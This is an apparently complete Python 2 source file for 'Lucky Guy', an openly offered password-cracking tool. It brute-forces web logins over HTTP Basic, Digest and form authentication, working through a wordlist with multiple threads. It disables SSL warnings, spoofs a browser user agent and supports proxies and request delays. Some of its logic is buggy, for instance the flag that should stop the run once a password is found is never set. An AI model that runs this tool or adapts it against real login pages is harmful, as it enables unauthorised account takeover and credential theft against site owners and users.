#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests
from threading import Thread
import argparse
import re
import time
import sys
from yaml import load
from requests.auth import HTTPDigestAuth
from termcolor import colored
import json
import warnings

global match
match = 0 # while variable match = 1 => password true

def checkURL(url):
	regex = re.compile(
        r'^(?:http|ftp)s?://' # http:// or https://
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|' # domain...
        r'localhost|' # localhost...
        r'(?:2(?:5[0-5]|[0-4][0-9])|[0-1]?[0-9]{1,2})(?:\.(?:2(?:5[0-5]|[0-4][0-9])|[0-1]?[0-9]{1,2})){3})' # IP...
        r'(?::\d+)?' # optional port
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
	if re.match(regex,url) != None:
		#print 'Validate >> %s << ... Sound good!'%(url)
		pass
	else:
		print 'Please re-check input >> %s << \nExit...'%(url)
		sys.exit(0)

def getBanner():
	print '''

 __                         __                 ______                    
/  |                       /  |               /      \                   
$$ |      __    __  _______$$ |   __ __    __/$$$$$$  |__    __ __    __ 
$$ |     /  |  /  |/       $$ |  /  /  |  /  $$ | _$$//  |  /  /  |  /  |
$$ |     $$ |  $$ /$$$$$$$/$$ |_/$$/$$ |  $$ $$ |/    $$ |  $$ $$ |  $$ |
$$ |     $$ |  $$ $$ |     $$   $$< $$ |  $$ $$ |$$$$ $$ |  $$ $$ |  $$ |
$$ |_____$$ \__$$ $$ \_____$$$$$$  \$$ \__$$ $$ \__$$ $$ \__$$ $$ \__$$ |
$$       $$    $$/$$       $$ | $$  $$    $$ $$    $$/$$    $$/$$    $$ |
$$$$$$$$/ $$$$$$/  $$$$$$$/$$/   $$/ $$$$$$$ |$$$$$$/  $$$$$$/  $$$$$$$ |
                                    /  \__$$ |                 /  \__$$ |
                                    $$    $$/                  $$    $$/ 
                                     $$$$$$/                    $$$$$$/  


Lucky Guy - a password cracking tool
	'''

def bruteBasic(url, acc, word):
	global browser
	rq = browser.get(url, auth=(acc,word), verify=False)
	if rq.status_code == 200:
		global match
		match == 1
		print '[*] Password found: ' + colored(word, 'green')
		sys.exit(0)
	else:
		print '[-] Not valid: ' + colored(word, 'red')

def bruteDig(url, acc, word):
	global browser
	rq = browser.get(url, auth=HTTPDigestAuth(acc, word), verify=False)
	if rq.status_code == 200:
		global match
		match == 1
		print '[*] Password found: ' + colored(word, 'green')
		sys.exit(0)
	else:
		print '[-] Not valid: ' + colored(word, 'red')

def bruteForm(url, data, word, jsoner, excp0, excp1):
	global browser
	data = data.replace('&',' ').replace('=',' ').split(' ')
	data = dict(zip(data[::2],data[1::2]))
	if jsoner == 'on':
		data = json.dumps(data)
	start = time.time()
	rq = browser.post(url, data, verify=False)
	stop = time.time()
	totalTime = str(stop-start)
	chars = len(rq.content)
	code = int(rq.status_code)
	if rq.history != []:
				firstStatus = rq.history[0]
				code = int(firstStatus.status_code)
	else:
		pass
	if excp0 == 'code':
		if excp1 != code:
			if 200 <= code < 300:
				print 'Time: %s \t Status: %s \t Chars: %s \t Value: %s' %(totalTime, colored(str(code),'green'), chars, word)
			if 300 <= code < 400:
				print 'Time: %s \t Status: %s \t Chars: %s \t Value: %s' %(totalTime, colored(str(code),'blue'), chars, word)
			if 400 <= code < 500:
				print 'Time: %s \t Status: %s \t Chars: %s \t Value: %s' %(totalTime, colored(str(code),'red'), chars, word)
		else:
			pass
	if excp0 == 'chars':
		if excp1 != chars:
			if 200 <= code < 300:
				print 'Time: %s \t Status: %s \t Chars: %s \t Value: %s' %(totalTime, colored(str(code),'green'), chars, word)
			if 300 <= code < 400:
				print 'Time: %s \t Status: %s \t Chars: %s \t Value: %s' %(totalTime, colored(str(code),'blue'), chars, word)
			if 400 <= code < 500:
				print 'Time: %s \t Status: %s \t Chars: %s \t Value: %s' %(totalTime, colored(str(code),'red'), chars, word)
		else:
			pass

class performReq(Thread):
	def __init__(self, url, data, acc, method, proxy, custom, word, sleep, json, excp0, excp1):
		Thread.__init__(self)
		try:
			warnings.filterwarnings('ignore') # Disable SSL related warnings
			global browser 
			browser = requests.session()
			self.word = word.split('\n')[0]
			self.url = url
			if data != None:
				self.data = data.replace('FORCE',self.word)
			self.acc = acc
			self.method = method
			#import pdb; pdb.set_trace()
			self.custom = {'User-Agent':'Mozilla/5.0 (Mobile; rv:26.0) Gecko/26.0 Firefox/26.0'}
			self.custom = dict(self.custom)
			if custom != None:
				self.custom = dict(custom)
			for key,value in self.custom.iteritems():
				browser.headers[key] = value
			self.proxy = ''
			if proxy != None:
				self.proxy = proxy
				protocol = ''.join(re.findall(r'(?:http)s?://',self.proxy)).split(':')[0]
				browser.proxies[protocol] = self.proxy
			self.sleep = sleep
			time.sleep(self.sleep)
			self.json = json
			self.excp0 = excp0
			self.excp1 = excp1
		except Exception, e:
			raise e

	def run(self):
		try:
			global match
			if match == 0:
				if self.method == 'basic':
					bruteBasic(self.url, self.acc, self.word)
				elif self.method == 'digest':
					bruteDig(self.url, self.acc, self.word)
				else:
					bruteForm(self.url, self.data, self.word, self.json, self.excp0, self.excp1)
				counter[0] = counter[0] - 1
		except Exception, e:
			print e

def lauchThreads(url,thrd,data,acc,method,proxy,custom,words,sleep,json,excp0,excp1):
	global counter
	counter = []
	counter.append(0)
	for i in range(0,len(words)-1):
		try:
			if counter[0] < thrd:
				word = words[i]
				counter[0] = counter[0] + 1
				thread = performReq(url, data, acc, method, proxy, custom, word, sleep, json, excp0, excp1)
				#import pdb; pdb.set_trace()
				thread.start()
		except KeyboardInterrupt:
			print 'Keyboard interrupted by user. Finish attack!'
			sys.exit()
		i+=1
		thread.join()
	return

def main():
	getBanner()
	parser = argparse.ArgumentParser() # Create ArgumentParser object
	parser.add_argument('-u', '--url', type=str, required=True, help='Target website, for exapmle: http://abc.com/login.php')
	parser.add_argument('-t', '--thread', type=int, default=3, dest='thrd', help='Set working threads, default: 3')
	parser.add_argument('-f', '--file', type=str, default='passwords.txt', help='Set password list to bruteforce')
	parser.add_argument('-m', '--method', type=str, default='basic', choices=['basic','digest','form'], help='Login method \
		such as: Basic Authentication, Digest Authentication and Form Base. Default: basic')
	parser.add_argument('-a', '--account', type=str, default='admin', help='Set username to bruteforce \
		- using for basic mode and digest mode. Default: admin')
	parser.add_argument('-d', '--data', type=str, help='Set data payload for bruteforce, example: "user=admin&pass=FORCE"')
	parser.add_argument('-p', '--proxy', type=str, help='Set network proxy, such as: http://127.0.0.1:8080')
	parser.add_argument('-c', '--custom', type=load, help='Custom header by adding json value, for example: \
		"{\'User-Agent\':\'Firefox\', \'Cookies\':\'abcdef\'}"')
	parser.add_argument('-s', '--sleep', type=int, default=0 ,help='Set delay seconds time for requests, default: 0s')
	parser.add_argument('-j', '--json', type=str, choices=['on','off'], default='off', help='If data in json format, set "-j on", \
		default: off')
	parser.add_argument('-e','--except',nargs=2, dest='excp', help='Set except data for result, such as: code 200, chars 1234')
	args = parser.parse_args()
	url = args.url
	checkURL(url)
	thrd = args.thrd
	sleep = args.sleep
	json = args.json
	data = args.data
	if 'FORCE' not in data:
		print 'Please check input data format!\nExit...'
		sys.exit(0)
	acc = args.account
	method = args.method
	if method == 'basic' or method == 'digest':
		if data != None:
			print 'With BasicAuth or DigestAuth, you do not need -d option!\nExit...'
			sys.exit(0)
		else:
			print 'Trying to crack > ' + colored(acc, 'blue') + ' < password'
	else:
		if data == None:
			print '-d option is required for Form Base bruteforce! Exit...'
			sys.exit(0)
		else:
			pass
	proxy = args.proxy
	if proxy != None:
		checkURL(proxy)
	custom = args.custom
	excp = args.excp
	if excp != None:
		if excp[0] == 'code' or excp[0] == 'chars':
			excp0 = excp[0]
		else:
			print 'Please input "code" or "chars" to 1st arg of -e'
			sys.exit(0)
		try:
			excp1 = int(excp[1])
		except Exception, e:
			print 'Please input integer value to 2nd arg of -e'
	else:
		excp0 = 'code'
		excp1 = 0
	inputFile = args.file 
	try:
		f = open(inputFile, 'r')
		words = f.readlines()
	except:
		print 'Failed to open >> %s << file!\nExit...'%(inputFile)
		sys.exit(0)
	lauchThreads(url,thrd,data,acc,method,proxy,custom,words,sleep,json,excp0,excp1)

if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt:
		print 'Keyboard interrupted by user, stop working...!'
